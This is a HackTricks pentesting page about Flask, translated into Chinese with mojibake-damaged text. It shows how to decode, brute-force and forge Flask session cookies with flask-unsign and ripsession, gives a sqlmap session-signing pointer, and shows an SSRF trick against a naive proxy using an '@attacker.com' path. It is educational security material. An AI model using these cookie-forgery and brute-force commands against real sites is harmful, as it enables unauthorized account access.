# Flask

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

**å¦‚æœä½ æ­£åœ¨å‚åŠ  CTFï¼ŒFlask åº”ç”¨ç¨‹åºå¯èƒ½ä¸** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**ç›¸å…³ã€‚**

## Cookies

é»˜è®¤çš„ cookie ä¼šè¯åç§°æ˜¯ **`session`**ã€‚

### Decoder

åœ¨çº¿ Flask cookie è§£ç å™¨ï¼š[https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Manual

è·å– cookie çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªç‚¹ï¼Œå¹¶è¿›è¡Œ Base64 è§£ç ã€‚
```bash
echo "ImhlbGxvIg" | base64 -d
```
cookie ä¹Ÿä½¿ç”¨å¯†ç è¿›è¡Œç­¾å

### **Flask-Unsign**

å‘½ä»¤è¡Œå·¥å…·ï¼Œé€šè¿‡çŒœæµ‹ç§˜å¯†å¯†é’¥æ¥è·å–ã€è§£ç ã€æš´åŠ›ç ´è§£å’Œåˆ¶ä½œ Flask åº”ç”¨ç¨‹åºçš„ä¼šè¯ cookieã€‚

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **è§£ç  Cookie**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **æš´åŠ›ç ´è§£**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ç­¾å**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ä½¿ç”¨æ—§ç‰ˆæœ¬è¿›è¡Œç­¾å
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºä½¿ç”¨ç”¨flask-unsignåˆ¶ä½œçš„cookieå¯¹ç½‘ç«™è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi in Flask session cookie with SQLmap

[**è¿™ä¸ªä¾‹å­**](../../pentesting-web/sql-injection/sqlmap/#eval) ä½¿ç”¨ sqlmap `eval` é€‰é¡¹æ¥ **è‡ªåŠ¨ç­¾å sqlmap è´Ÿè½½** ä»¥ä¾¿äº flaskï¼Œä½¿ç”¨å·²çŸ¥çš„å¯†é’¥ã€‚

## Flask Proxy to SSRF

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) è§£é‡Šäº† Flask å¦‚ä½•å…è®¸ä»¥å­—ç¬¦ "@" å¼€å¤´çš„è¯·æ±‚ï¼š
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
åœ¨ä»¥ä¸‹åœºæ™¯ä¸­ï¼š
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
å¯ä»¥å…è®¸å¼•å…¥ç±»ä¼¼â€œ@attacker.comâ€çš„å†…å®¹ï¼Œä»¥å¯¼è‡´**SSRF**ã€‚

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask)è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
